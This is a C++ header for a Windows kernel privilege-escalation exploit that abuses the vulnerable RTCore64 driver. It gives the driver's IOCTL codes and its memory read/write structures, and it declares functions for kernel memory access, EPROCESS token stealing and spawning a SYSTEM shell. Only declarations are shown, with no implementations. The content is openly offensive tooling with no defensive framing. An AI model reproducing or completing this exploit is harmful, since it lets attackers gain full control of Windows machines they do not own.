#pragma once

#include <Windows.h>
#include <Psapi.h>
#include <cstdio>
#include <cstdarg>

// RTCore64 Driver Structures and Constants
struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

// IOCTL Codes
static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

// Process Structure Offsets
struct ProcessOffsets {
    DWORD64 UniqueProcessIdOffset;    // Offset to UniqueProcessId field
    DWORD64 ActiveProcessLinksOffset; // Offset to ActiveProcessLinks field
    DWORD64 TokenOffset;              // Offset to Token field
};

// Error Codes
enum class RTCoreResult : DWORD {
    Success = 0,
    DeviceHandleError,
    MemoryReadError,
    MemoryWriteError,
    ProcessNotFound,
    VersionNotSupported,
    KernelAddressError,
    TokenManipulationError
};

// Function Declarations

// Logging functions
void Con(const char* Message, ...);
void ConError(const char* Message, ...);
void ConSuccess(const char* Message, ...);

// Device operations
HANDLE OpenRTCoreDevice();
void CloseRTCoreDevice(HANDLE Device);

// Memory operations
DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address);
RTCoreResult WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value);
WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address);
DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address);
DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address);
RTCoreResult WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value);

// Kernel operations
unsigned long long GetKernelBaseAddress();
DWORD64 GetPsInitialSystemProcessOffset();

// Process operations
RTCoreResult FindProcessInActiveList(HANDLE Device, DWORD TargetPID, const ProcessOffsets& Offsets, 
                                     DWORD64 SystemProcessAddress, DWORD64* ProcessAddress);
RTCoreResult PerformTokenStealing(HANDLE Device, DWORD TargetPID, const ProcessOffsets& Offsets);

// Version and compatibility
ProcessOffsets GetVersionOffsets();
bool IsCompatibleWindowsVersion();

// Process management  
RTCoreResult SpawnSystemShell();

// Main exploitation function
RTCoreResult ExploitRTCore64(DWORD TargetPID = 0);